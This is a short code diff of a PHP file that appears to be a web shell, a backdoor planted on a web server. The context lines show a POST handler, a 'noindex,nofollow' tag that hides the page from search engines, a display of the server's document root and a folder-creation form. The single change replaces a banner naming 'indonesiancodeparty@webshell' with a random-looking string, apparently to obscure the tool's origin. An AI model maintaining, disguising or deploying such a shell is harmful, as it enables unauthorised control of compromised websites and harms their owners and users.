@@ -122,7 +122,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 }
 
 echo '<meta name="robots" content="noindex,nofollow">';
-echo '<pre>indonesiancodeparty@webshell | '.($_SERVER['DOCUMENT_ROOT']);
+echo '<pre>bajsinbsb7s8sbk@sbjhsbis | '.($_SERVER['DOCUMENT_ROOT']);
 echo '</pre>';
 echo '<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">';
 echo '<input type="text" name="n" placeholder="Create New Folder">';
